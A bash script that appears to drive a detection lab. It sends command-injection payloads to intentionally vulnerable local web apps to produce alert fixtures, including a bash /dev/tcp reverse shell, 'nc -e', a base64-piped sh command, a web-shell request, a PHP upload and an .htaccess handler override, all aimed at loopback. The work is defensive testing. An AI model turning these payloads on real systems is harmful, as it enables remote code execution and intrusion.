#!/usr/bin/env bash
# Produce one live event per test case on the lab victim (../../lab), so that
# `w2s.py capture` can save them as fixtures. Run ON THE VICTIM as root:
#
#   sudo ./drive.sh
#
# Every action is benign and loopback-scoped: injected commands only touch
# 127.0.0.1 (port 9, which is closed), and the "reverse shells" fail to connect.
# WARNING: the lab apps are exploitable by design. Throwaway VM only.
set -uo pipefail
[[ $EUID -eq 0 ]] || { echo "run as root" >&2; exit 1; }

V=http://127.0.0.1
enc() { python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$1"; }
php()  { curl -s -m 5 "$V/ping.php?host=$(enc "127.0.0.1;$1")" >/dev/null; echo "  [php]  $1"; }
node() { curl -s -m 5 "$V/node/ping?host=$(enc "127.0.0.1;$1")" >/dev/null; echo "  [node] $1"; }
get()  { curl -s -m 5 -o /dev/null "$V$1"; echo "  [get]  $1"; }
pause() { sleep 2; }

echo "[exec] process-execution layer"
php  "id";                                                  pause
php  "curl -s http://127.0.0.1/ -o /dev/null";              pause
php  "echo aWQ= | base64 -d | sh";                          pause
php  "bash -c 'bash -i >& /dev/tcp/127.0.0.1/9 0>&1'";      pause
php  "nc -e /bin/true 127.0.0.1 9";                         pause
php  "python3 -c 'print(1)'";                               pause
php  "python3 /dev/null";                                   pause
node "uname -a";                                            pause

echo "[exec] PHP mail(): known-good, must stay silent unless injected"
sudo -u www-data php -r 'mail("a@example.com","s","b");' 2>/dev/null;                            echo "  mail()"; pause
sudo -u www-data php -r 'mail("a@example.com","s","b","","-fnoreply@example.com");' 2>/dev/null; echo "  mail() -f"; pause
# PHP escapes the ";" for the shell, but it is still in the command line.
sudo -u www-data php -r 'mail("a@example.com","s","b","","-fx@example.com;id");' 2>/dev/null;    echo "  mail() -f injected"; pause

echo "[web] access-log layer"
get "/ping.php?host=$(enc '127.0.0.1;/bin/sh -c id')";      pause
get "/ping.php?x=$(enc 'system(id)')";                      pause
get "/shell.php?cmd=ls";                                    pause
get "/ping.php?host=127.0.0.1";                             pause

echo "[fim] file-integrity layer"
printf '<?php echo "lab marker"; ?>\n' > /tmp/note.php
curl -s -m 5 -F "file=@/tmp/note.php" "$V/upload.php" >/dev/null; echo "  upload note.php"; pause
get "/uploads/note.php";                                    pause
printf 'AddType application/x-httpd-php .png\n' > /var/www/html/uploads/.htaccess; echo "  .htaccess"
printf 'console.log(1)\n' > /opt/nodeapp/lab-marker.js;     echo "  lab-marker.js"
mkdir -p /opt/nodeapp/node_modules/x && printf '1\n' > /opt/nodeapp/node_modules/x/index.js; echo "  node_modules/x/index.js"
pause

echo "[cleanup]"
rm -f /var/www/html/uploads/note.php /var/www/html/uploads/.htaccess /opt/nodeapp/lab-marker.js /tmp/note.php
rm -rf /opt/nodeapp/node_modules
echo "done: wait ~1 minute for indexing, then run w2s.py capture on the manager"
